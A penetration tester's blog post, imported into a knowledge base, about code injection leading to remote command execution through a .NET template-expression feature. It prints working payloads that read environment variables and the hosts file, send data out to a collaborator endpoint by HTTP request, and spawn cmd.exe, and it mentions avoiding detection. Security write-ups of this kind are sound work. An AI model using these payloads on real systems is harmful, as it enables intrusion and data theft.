---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-04-29_code-injection-to-rce-with-net.md
original_filename: 2024-04-29_code-injection-to-rce-with-net.md
title: Code Injection to RCE with .NET
category: documents
detected_topics:
- sso
- command-injection
- automation-abuse
- business-logic
- api-security
tags:
- imported
- documents
- sso
- command-injection
- automation-abuse
- business-logic
- api-security
language: en
raw_sha256: b42fcc52473805734477a1241561f240d993713f5509223dab8717ba6bfffb73
text_sha256: fe3eb3e5f9913c4c35cf1da0dc04215d0222de007927798738380e1fe4996884
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: false
---

# Code Injection to RCE with .NET

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-04-29_code-injection-to-rce-with-net.md
- Source Type: markdown
- Detected Topics: sso, command-injection, automation-abuse, business-logic, api-security
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: False
- Raw SHA256: `b42fcc52473805734477a1241561f240d993713f5509223dab8717ba6bfffb73`
- Text SHA256: `fe3eb3e5f9913c4c35cf1da0dc04215d0222de007927798738380e1fe4996884`


## Content

---
title: "Code Injection to RCE with .NET"
url: "https://blog.stratumsecurity.com/2024/04/29/code-injection-to-rce-with-net/"
final_url: "https://blog.stratumsecurity.com/2024/04/29/code-injection-to-rce-with-net/"
authors: ["Phil Thomas"]
bugs: ["Code injection", "RCE"]
publication_date: "2024-04-29"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 314
---

# Code Injection to RCE with .NET

  * [ ![Phil Thomas](https://www.gravatar.com/avatar/761d0ffe844e48bed7ff9db65f20fdd1?s=250&r=x&d=mp) ](/author/phil/)

#### [Phil Thomas](/author/phil/)

29 Apr 2024 • 4 min read

Share

During a security assessment for a client’s web application, I encountered a feature that allowed users to define templates containing expressions, specifically for operations related to mathematics, logic, and strings. These templates contained expressions that were vulnerable to Code Injection and, subsequently, Remote Command Execution.

### Overview of the Application

This web application is used by business analysts to organize claims. These analysts define templates to streamline the creation of emails, notes, and text messages that contain various metadata about incidents.

### Discovery of Vulnerability

**Initial Encounter**

While performing my initial and manual walkthrough of the application, I noticed several form fields that used different controls compared to the typical text boxes, combo boxes, and check boxes that I expected from CRUD (Create, Read, Update, and Delete) functionality. These controls appeared to accept expressions of some sort and had a button to validate their syntax.

Since this application contained hundreds of forms and complex business logic, I decided to take note of these controls to revisit later, then I continued along with my walkthrough. Diving straight into a rabbit hole is a terrible waste just to realize that nothing is there.

**Investigation Process**

A few days later, I had the chance to review these controls in more detail. They appeared to accept some expressions surrounded by `<%` and `%>`. That is interesting, but what expressions can we use?

Well, within the application, they allow for `Abs`, `Avg`, `Sum`, etc., just your typical math operations. There are also some data operations, such as `AddDays` and `SubtractDays`. Okay, but still nothing juicy. There were about 30 functions between math and date operations, but at the bottom of the list (of course), there was a grouping for string operations. Hmmm, what could that possibly be?

Expanding the list, we start to see the functions `IsNullOrWhitespace`, `Substring`, `StartsWith`, `PadLeft`, `ToUpperInvariant`, etc. Well, that is indeed interesting. Why? Well, that looks awfully similar to the [.NET Framework's String Class](https://learn.microsoft.com/en-us/dotnet/api/system.string?view=net-8.0&ref=blog.stratumsecurity.com#methods). 

### Exploiting the Vulnerability

At this point, we know we can use simple expressions such as:

  * `<%string.IsNullOrWhitespace(…)%>`
  * `<%string.StartsWith(…)%>`
  * `<%string.Substring(…)%>`

All of which are functions that return a value. So, what if we input a .NET method such as `Dns.GetHostName()` which returns a string containing the system’s hostname. Do we get a hostname back?
  
  
  {
  "ErrorDescription":"The type or namespace name 'Dns' does not exist in the namespace 'System' (are you missing an assembly reference?)\r\nThe use of certain classes/namespaces is disallowed.\r\n</br>"
  }
  

Okay, so `Dns` can’t be found in `System`, but we know that class exists, per the [documentation](https://learn.microsoft.com/en-us/dotnet/api/system.net.dns.gethostname?view=net-8.0&ref=blog.stratumsecurity.com). What if we include the fully qualified type in the call`<%System.Net.Dns.GetHostName()%>`?  

![](https://storage.ghost.io/c/3b/1b/3b1b83bf-194f-498a-acf4-016bfc6d6580/content/images/2024/04/image-2.png)Hostname returned from .NET call

Woah, this is progress! At this point, we have sufficient evidence to demonstrate Code Injection. Now, we could try to pop a shell, but why risk getting caught and blocked? Let’s obtain some more information using .NET methods rather than directly spawning processes:

  * The user name associated with the current thread: `System.Environment.UserName`
  * Information about the .NET runtime installation (.NET Framework, .NET Core): `System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription` —Maybe they are running an outdated version.
  * Read the contents of a file on the host: `System.IO.File.ReadAllText(@"C:\Windows\System32\drivers\etc\hosts")`
  * Perform an HTTP GET: `new System.Net.WebClient().DownloadString("https://....")` — We could pair this with the `System.Convert.ToBase64String()` method to pass data to our collaborator endpoint.
  * Obtain environment variables: `string.Join(“,”, System.Environment.GetEnvironmentVariables())`

Now, I’ve obtained much information through .NET methods across multiple namespaces. Interestingly, _“The use of certain classes/namespaces is disallowed”_ was in a previous error message. It seems odd that they would explicitly allow some of these calls, so I’ll go ahead and assume they aren’t enforcing it properly, if at all. Again, this is yet another reason to continue testing rather than taking error messages at face value.

Lastly, let’s go ahead and spawn a process on the host. We could just as easily have done this with .NET using `System.IO.Directory.GetFiles()` , but I want to demonstrate a direct process call.
  
  
  System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo{FileName = "cmd.exe",Arguments = "/c dir",UseShellExecute = false,RedirectStandardOutput = true,CreateNoWindow = true}).StandardOutput.ReadToEnd()
  

In this payload, we are spawning a `cmd.exe` process with the `cmd` dir to be executed, which outputs the contents of the `C:\` drive. There are some caveats to this application that we can’t have a payload spread across multiple lines, so we needed to declare objects inline and chain the calls to `Start()`, `StandardOutput`, and `ReadToEnd()`.

![](https://storage.ghost.io/c/3b/1b/3b1b83bf-194f-498a-acf4-016bfc6d6580/content/images/2024/04/image-3.png)Evidence from RCE and Code Injection

### Reflections

Two of the main lessons I learned from this engagement that I want to share are about the importance of Diligence and Sharing.

![](https://storage.ghost.io/c/3b/1b/3b1b83bf-194f-498a-acf4-016bfc6d6580/content/images/2024/04/image.png)Combing the Desert - Spaceballs (1987)

**Importance of Diligence**

Large web applications can be comprised of sophisticated workflows and subsequently have complex requests. This vulnerability isn’t anything that Burp’s Active Scan or another automated scanner would have discovered, which reiterates the importance of manual testing.

It’s not realistic for a client to perform a walkthrough covering every application feature, especially with complex applications. Sometimes, documentation is available; however, it’s primarily up to us to understand how the end-user uses the application.

Despite initial findings of only low and informational vulnerabilities after 20 hours of work, I persevered. This vulnerability possibly eluded even my respected peers, illustrating that it’s crucial not to rely on past results or assumptions. My peers had spent their time on vulnerabilities that I had not discovered, or that had already been remediated. Lastly, you never know what application functionality may have changed since its last review.

> Trust, but verify.

**Importance of Sharing**

In this case, my background as a .NET software engineer gave me specific insights into the string operation methods and intricacies others may have overlooked. I’ve shared this knowledge with our team, which in turn increases our collective expertise. Encouraged by my peers, I transformed these insights into the blog post that you are reading now.

The diversity of our backgrounds enriches our collective understanding. The exchange of knowledge isn’t just about expanding our own skills; it’s about creating a community where everyone is better equipped to identify and tackle vulnerabilities that might otherwise go unnoticed.

I encourage you to share your workflows, tools, and insights openly.
